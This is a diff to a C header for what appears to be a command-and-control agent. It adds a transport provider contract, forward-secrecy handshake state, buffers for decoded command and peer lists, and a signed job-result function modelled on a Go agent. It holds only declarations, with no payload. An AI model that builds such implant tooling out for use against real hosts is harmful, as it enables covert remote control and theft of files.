@@ -57,9 +57,11 @@ typedef struct {
   c2_str close_header;
   c2_str close_value;
 
-  /* Static headers as parallel arrays (map order is irrelevant). */
-  const c2_str *header_keys;
-  const c2_str *header_values;
+  /* Static headers as parallel arrays. On decode, `header_cap` is the caller's
+   * capacity and `header_count` is set to the number actually decoded. */
+  c2_str *header_keys;
+  c2_str *header_values;
+  size_t header_cap;
   size_t header_count;
 } c2_http_profile;
 
@@ -177,9 +179,26 @@ typedef struct {
   void *ctx;
 } c2_transport;
 
+/*
+ * Transport provider contract. Exactly one provider is compiled in, selected
+ * with `TRANSPORT=<name>`: src/transport/c2_transport_<name>.c. The provider
+ * owns its context; the session passes the profile and a resolved URL to
+ * c2_transport_ops.open for every stream.
+ *
+ *   http_poll (default): request/response HTTP over c2_http_client.
+ *
+ * Add a provider by dropping src/transport/c2_transport_<name>.c into the tree
+ * and building with TRANSPORT=<name>.
+ */
+c2_transport c2_transport_create(const c2_agent_config *cfg);
+const char *c2_transport_name(void);
+
 /* ------------------------------------------------------------------------- */
 /* Agent session                                                              */
 /* ------------------------------------------------------------------------- */
+
+/* The message tunnel needs bounded storage for decoded command/peer lists. */
+#define C2_SESSION_LIST_MAX 128u
 
 typedef struct {
   const c2_crypto_backend *be;
@@ -192,8 +211,19 @@ typedef struct {
 
   /* Ephemeral key and derived key for the current msg tunnel. */
   uint8_t pfs_priv[C2_P256_PRIV_BYTES];
+  uint8_t pfs_pub[C2_P256_PUB_BYTES];
   uint8_t session_key[C2_AES_KEY_BYTES];
   int pfs_established;
+  int pfs_pending;       /* a first hello is awaiting its handshake reply */
+  char hello_job_id[40]; /* JobID of the most recent hello */
+
+  /* Owns the bytes that decoded MsgTunData fields point into. A message stays
+   * valid until the next c2_session_read. */
+  uint8_t *rxbuf;
+  size_t rxcap;
+  /* Backing storage for the decoded command/peer string lists. */
+  c2_str rx_cmd_items[C2_SESSION_LIST_MAX];
+  c2_str rx_peer_items[C2_SESSION_LIST_MAX];
 } c2_agent_session;
 
 /*
@@ -204,6 +234,17 @@ typedef struct {
 c2_status c2_session_init(c2_agent_session *s, const c2_crypto_backend *be,
                           c2_transport transport, const c2_agent_config *cfg,
                           const uint8_t *agent_priv);
+
+/*
+ * Set the agent identity public key when c2_session_init was given an imported
+ * private key (the vtable has no "public from private" primitive). A generated
+ * identity already has it.
+ */
+void c2_session_set_identity_pub(c2_agent_session *s,
+                                 const uint8_t pub[C2_P256_PUB_BYTES]);
+
+/* Release the session's read buffer (safe on a zeroed session). */
+void c2_session_cleanup(c2_agent_session *s);
 
 /*
  * Open `route` and send a signed MsgAuth. For auxiliary routes the SecureConn
@@ -241,10 +282,13 @@ c2_status c2_session_read(c2_agent_session *s, c2_secureconn *msg,
 
 /*
  * Send a job result: same JobID and CmdSlice as the request, Response = output.
- * The frame is written as a bulk frame (no padding).
+ * The frame is written as a bulk frame (no padding). The agent's Tag/UUID and a
+ * fresh UUID signature are included, exactly like the Go agent's NotifyC2: the
+ * C2 routes the reply by Tag/UUID, so a reply without them is dropped with
+ * "target cannot be found".
  */
-c2_status c2_session_send_result(c2_secureconn *msg, c2_str job_id,
-                                 const c2_str_list *cmd_slice,
+c2_status c2_session_send_result(c2_agent_session *s, c2_secureconn *msg,
+                                 c2_str job_id, const c2_str_list *cmd_slice,
                                  const uint8_t *response, size_t response_len);
 
 /* File upload over the FTP route: open(ftp, token), gzip the file bytes, and
